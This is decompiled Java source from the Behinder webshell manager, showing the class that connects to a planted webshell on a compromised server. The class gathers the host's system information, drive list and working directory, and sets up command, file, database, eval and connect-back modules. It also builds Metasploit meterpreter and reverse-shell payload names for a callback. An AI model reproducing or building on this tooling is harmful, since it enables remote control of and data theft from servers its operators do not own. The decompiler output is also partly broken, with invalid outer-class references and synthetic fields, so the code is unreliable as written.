 package net.rebeyond.behinder.ui;
 
 import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
 import java.io.ByteArrayInputStream;
 import java.util.Map;
 import java.util.Random;
 import java.util.UUID;
 import net.rebeyond.behinder.core.ShellManager;
 import net.rebeyond.behinder.core.ShellService;
 import net.rebeyond.behinder.utils.Constants;
 import net.rebeyond.behinder.utils.Utils;
 import org.eclipse.swt.browser.Browser;
 import org.eclipse.swt.custom.StyledText;
 import org.eclipse.swt.graphics.Image;
 import org.eclipse.swt.widgets.Combo;
 import org.eclipse.swt.widgets.Display;
 import org.eclipse.swt.widgets.Label;
 import org.eclipse.swt.widgets.Text;
 import org.eclipse.swt.widgets.Tree;
 import org.eclipse.swt.widgets.TreeItem;
 import org.json.JSONObject;
 
 
 
 
 
 public class BasicInfoUtils
 {
   public static void main(String[] args) {}
   
   public static void formatPayloadName(String currentType, Text msfTipsTxt, String shellType)
   {
     String payloadName = "java/meterpreter/reverse_tcp";
     if (currentType.equals("php"))
     {
       payloadName = "php/meterpreter/reverse_tcp";
     }
     else if (currentType.equals("aspx"))
     {
       payloadName = "windows/meterpreter/reverse_tcp";
     }
     String result = msfTipsTxt.getText().replace("%s", payloadName);
     if (shellType.equals("shell"))
     {
       result = result.replace("meterpreter", "shell");
       result = result.replace("Meterpreter", "Shell");
       if (currentType.equals("php"))
       {
         result = result.replace("php/shell/reverse_tcp", "php/reverse_php");
       }
       if (currentType.equals("jsp"))
       {
         result = result.replace("java/shell/reverse_tcp", "java/jsp_shell_reverse_tcp");
       }
       
     }
     else
     {
       result = result.replace("shell", "meterpreter");
       result = result.replace("Shell", "Meterpreter");
       if (currentType.equals("php"))
       {
         result = result.replace("php/reverse_php", "php/meterpreter/reverse_tcp");
       }
       if (currentType.equals("jsp"))
       {
         result = result.replace("java/jsp_shell_reverse_tcp", "java/meterpreter/reverse_tcp");
       }
     }
     msfTipsTxt.setText(result);
   }
   
   public static void getBasicInfo(final JSONObject shellEntity, final Browser baseInfoView, final Tree dirTree, final Text cmdview, final Label connectStatus, Text memoTxt, final Text imagePathTxt, Text msfTipsTxt, final Label statusLabel, final StyledText sourceCodeTxt, final Browser updateInfo, final Combo currentPathCombo, final Text sqlTxt) throws Exception {
     int uaIndex = new Random().nextInt(Constants.userAgents.length - 1);
     final String currentUserAgent = Constants.userAgents[uaIndex];
     MainShell mainShell = (MainShell)dirTree.getShell();
     memoTxt.setText(shellEntity.getString("memo"));
     formatPayloadName(shellEntity.getString("type"), msfTipsTxt, "meterpreter");
     connectStatus.setText("Checking....");
     statusLabel.setText("正在获取基本信息……");
     new Thread() {
       public void run() {
         try {
           BasicInfoUtils.this.currentShellService = new ShellService(shellEntity, currentUserAgent);
           try
           {
             if (BasicInfoUtils.this.currentShellService.currentType.equals("php"))
             {
               String content = UUID.randomUUID().toString();
               JSONObject obj = BasicInfoUtils.this.currentShellService.echo(content);
               if (obj.getString("msg").equals(content))
               {
                 BasicInfoUtils.this.currentShellService.encryptType = Constants.ENCRYPT_TYPE_AES;
               }
               
             }
             
           }
           catch (Exception e)
           {
             e.printStackTrace();
             BasicInfoUtils.this.currentShellService.encryptType = Constants.ENCRYPT_TYPE_XOR;
           }
           
           JSONObject basicInfoObj = new JSONObject(BasicInfoUtils.this.currentShellService.getBasicInfo());
           final String basicInfoStr = new String(Base64.decode(basicInfoObj.getString("basicInfo")), "UTF-8");
           final String driveList = new String(Base64.decode(basicInfoObj.getString("driveList")), "UTF-8").replace(":\\", ":/");
           final String currentPath = new String(Base64.decode(basicInfoObj.getString("currentPath")), "UTF-8");
           final String osInfo = new String(Base64.decode(basicInfoObj.getString("osInfo")), "UTF-8").toLowerCase();
           BasicInfoUtils.this.basicInfoMap.put("basicInfo", basicInfoStr);
           BasicInfoUtils.this.basicInfoMap.put("driveList", driveList);
           BasicInfoUtils.this.basicInfoMap.put("currentPath", currentPath);
           BasicInfoUtils.this.basicInfoMap.put("osInfo", osInfo.replace("winnt", "windows"));
           
           Display.getDefault().syncExec(new Runnable() {
             public void run() {
               if (this.val$statusLabel.isDisposed())
                 return;
               this.val$baseInfoView.setText(basicInfoStr);
               this.val$statusLabel.setText("基本信息获取完成，你可以使用CTRL+F进行搜索");
               this.val$dirTree.removeAll();
               String[] arrayOfString; int j = (arrayOfString = driveList.split(";")).length; for (int i = 0; i < j; i++) { String drive = arrayOfString[i];
                 
                 TreeItem driveItem = new TreeItem(this.val$dirTree, 0);
                 driveItem.setText(drive);
                 driveItem.setData("type", "root");
                 
                 try
                 {
                   driveItem.setImage(new Image(this.val$dirTree.getDisplay(), new ByteArrayInputStream(Utils.getResourceData("net/rebeyond/behinder/resource/drive.png"))));
                 }
                 catch (Exception e) {
                   e.printStackTrace();
                 }
               }
               this.val$connectStatus.setForeground(Display.getDefault().getSystemColor(9));
               if (Main.currentProxy != null) {
                 this.val$connectStatus.setText("已连接(代理)");
               } else
                 this.val$connectStatus.setText("已连接");
               this.val$cmdview.setText(currentPath + " >");
               this.val$currentPathCombo.add(currentPath);
               this.val$currentPathCombo.setText(currentPath);
               if ((osInfo.indexOf("windows") >= 0) || (osInfo.indexOf("winnt") >= 0))
               {
 
                 this.val$imagePathTxt.setText("cmd.exe");
               }
               else
               {
                 this.val$imagePathTxt.setText("/bin/sh");
               }
             }
           });
           BasicInfoUtils.this.DBManagerUtils = new DBManagerUtils(BasicInfoUtils.this.currentShellService, statusLabel, sqlTxt);
           BasicInfoUtils.this.FileManagerUtils = new FileManagerUtils(BasicInfoUtils.this.currentShellService, statusLabel, currentPathCombo, (String)BasicInfoUtils.this.basicInfoMap.get("osInfo"));
           BasicInfoUtils.this.CmdUtils = new CmdUtils(BasicInfoUtils.this.currentShellService, statusLabel, shellEntity);
           BasicInfoUtils.this.EvalUtils = new EvalUtils(BasicInfoUtils.this.currentShellService, statusLabel, sourceCodeTxt);
           BasicInfoUtils.this.ConnectBackUtils = new ConnectBackUtils(BasicInfoUtils.this.currentShellService, statusLabel);
           Main.shellManager.updateOsInfo(shellEntity.getInt("id"), osInfo);
           new Thread() {
             public void run() {
               try {
                 this.val$mainShell.currentShellService.keepAlive();
               }
               catch (Exception e) {
                 e.printStackTrace();
 
 
 
 
 
               }
               
 
 
 
 
             }
             
 
 
 
 
 
           }.start();new Thread()
           {
             public void run()
             {
               try
               {
                 final String updateInfoRes = Utils.sendGetRequest("http://www.rebeyond.net/Behinder/update.html?ver=" + Constants.VERSION, "");
                 Display.getDefault().syncExec(new Runnable() {
                   public void run() {
                     if (this.val$statusLabel.isDisposed())
                       return;
                     this.val$updateInfo.setText(updateInfoRes);
                   }
                 });
               } catch (Exception e) {
                 e.printStackTrace();
               }
             }
           }.start();
         } catch (Exception e) {
           if ((e.getMessage() != null) && (!statusLabel.isDisposed()))
           {
             Display.getDefault().syncExec(new Runnable() {
               public void run() {
                 if (this.val$statusLabel.isDisposed())
                   return;
                 this.val$connectStatus.setForeground(Display.getDefault().getSystemColor(3));
                 this.val$connectStatus.setText("Failed!");
                 this.val$baseInfoView.setText(e.getMessage());
                 this.val$statusLabel.setText("基本信息获取失败:" + e.getMessage());
               }
             });
           }
           e.printStackTrace();
         }
       }
     }.start();
   }
 }


/* Location:              /Users/0x101/safe/mytools_10012106/afterLoader/Behinder.jar!/net/rebeyond/behinder/ui/BasicInfoUtils.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */